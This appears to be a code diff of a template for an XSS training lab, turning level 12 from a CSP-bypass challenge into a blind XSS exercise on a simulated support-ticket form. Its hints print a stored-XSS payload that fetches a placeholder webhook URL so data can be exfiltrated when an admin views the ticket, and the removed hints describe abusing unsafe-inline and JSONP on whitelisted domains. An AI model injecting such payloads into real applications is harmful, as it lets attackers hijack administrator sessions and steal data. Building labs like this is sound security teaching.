@@ -14,30 +14,31 @@
             <i class="bi bi-crosshair me-2"></i>Mission Control
         </div>
         <div class="mission-content">
-            <h5 class="mb-3">XSS with CSP Bypass</h5>
+            <h5 class="mb-3">Blind XSS</h5>
             <p class="text-secondary small mb-4">
-                Welcome to <strong>SecureApp</strong>. Test the security of this application.
+                Welcome to <strong>SupportDesk</strong>. Our admins review every ticket personally.
             </p>
 
             <div class="card mb-4 border-0 bg-light">
                 <div class="card-body p-3">
                     <h6 class="card-title small text-uppercase text-muted mb-2">Objective</h6>
-                    <p class="mb-0 small">Bypass Content Security Policy</p>
+                    <p class="mb-0 small">Inject a payload that executes when an admin views the ticket. Exfiltrate data
+                        to a webhook.</p>
                 </div>
             </div>
 
-            <!-- Integrated Hints System -->
             <div class="hint-accordion accordion" id="hintsAccordion">
                 <div class="accordion-item">
                     <h2 class="accordion-header">
                         <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
                             data-bs-target="#hint1">
-                            <i class="bi bi-lightbulb me-2"></i> Hint 1: Understanding CSP
+                            <i class="bi bi-lightbulb me-2"></i> Hint 1: Be Patient
                         </button>
                     </h2>
                     <div id="hint1" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
                         <div class="accordion-body small text-secondary">
-                            CSP restricts script sources. Check the CSP header for allowed sources and misconfigurations.
+                            You won't see the XSS execute immediately. It happens on the "Admin Panel" (simulated
+                            backend).
                         </div>
                     </div>
                 </div>
@@ -45,12 +46,13 @@
                     <h2 class="accordion-header">
                         <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
                             data-bs-target="#hint2">
-                            <i class="bi bi-code-slash me-2"></i> Hint 2: CSP Weaknesses
+                            <i class="bi bi-server me-2"></i> Hint 2: Exfiltration
                         </button>
                     </h2>
                     <div id="hint2" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
                         <div class="accordion-body small text-secondary">
-                            Look for unsafe-inline, unsafe-eval, or whitelisted CDNs you can abuse.
+                            Since you can't see the execution, you need the script to "call home". Use a service like
+                            `webhook.site` or `requestbin`.
                         </div>
                     </div>
                 </div>
@@ -63,7 +65,8 @@
                     </h2>
                     <div id="hint3" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
                         <div class="accordion-body small text-secondary">
-                            Exploit CSP misconfigurations like JSONP endpoints on whitelisted domains.
+                            Payload: <code>&lt;script&gt;fetch('YOUR_WEBHOOK_URL')&lt;/script&gt;</code>. (For this lab,
+                            fill in the Webhook URL field and inject standard XSS in the description).
                         </div>
                     </div>
                 </div>
@@ -99,7 +102,61 @@
         </div>
 
         <div class="app-frame p-4">
-            <p class="text-muted">Challenge interface for XSS Level 12</p>
+            <!-- Level 12: Blind XSS -->
+            <div class="card border-0 shadow-none mb-4">
+                <div class="card-body">
+                    <h4 class="mb-3">Submit Support Ticket</h4>
+
+                    {% if message %}
+                    <div
+                        class="alert {% if xss_detected %}alert-success{% else %}alert-info{% endif %} border-0 d-flex align-items-center mb-4">
+                        <i class="bi {% if xss_detected %}bi-check-circle{% else %}bi-info-circle{% endif %} me-2"></i>
+                        <div>{{ message }}</div>
+                    </div>
+                    {% endif %}
+
+                    {% if ticket_submitted %}
+                    <div class="alert alert-success border-0 mb-4">
+                        <h5 class="alert-heading h6"><i class="bi bi-check-circle me-2"></i>Ticket Submitted
+                            Successfully</h5>
+                        <p class="mb-0 small">Your ticket ID is <strong>{{ ticket_id }}</strong>. An administrator will
+                            review your issue shortly.</p>
+                    </div>
+                    {% endif %}
+
+                    <form method="POST" action="{{ url_for('xss_level12') }}" class="mb-4">
+                        <div class="row g-3">
+                            <div class="col-md-6">
+                                <label class="form-label">Name</label>
+                                <input type="text" class="form-control" name="name" required>
+                            </div>
+                            <div class="col-md-6">
+                                <label class="form-label">Email</label>
+                                <input type="email" class="form-control" name="email" required>
+                            </div>
+                            <div class="col-12">
+                                <label class="form-label">Subject</label>
+                                <input type="text" class="form-control" name="subject" required>
+                            </div>
+                            <div class="col-12">
+                                <label class="form-label">Description</label>
+                                <textarea class="form-control" name="description" rows="5" required></textarea>
+                            </div>
+                            <!-- Hidden simulated field for exfiltration testing -->
+                            <div class="col-12">
+                                <label class="form-label text-muted small">Webhook URL (for simulation)</label>
+                                <input type="url" class="form-control form-control-sm" name="webhook_url"
+                                    placeholder="https://webhook.site/..." value="{{ webhook_url }}">
+                                <div class="form-text">In a real scenario, you wouldn't provide this. We use this to
+                                    confirm you exfiltrated data.</div>
+                            </div>
+                        </div>
+                        <div class="mt-3">
+                            <button type="submit" class="btn btn-primary">Submit Ticket</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
         </div>
     </div>
 </div>
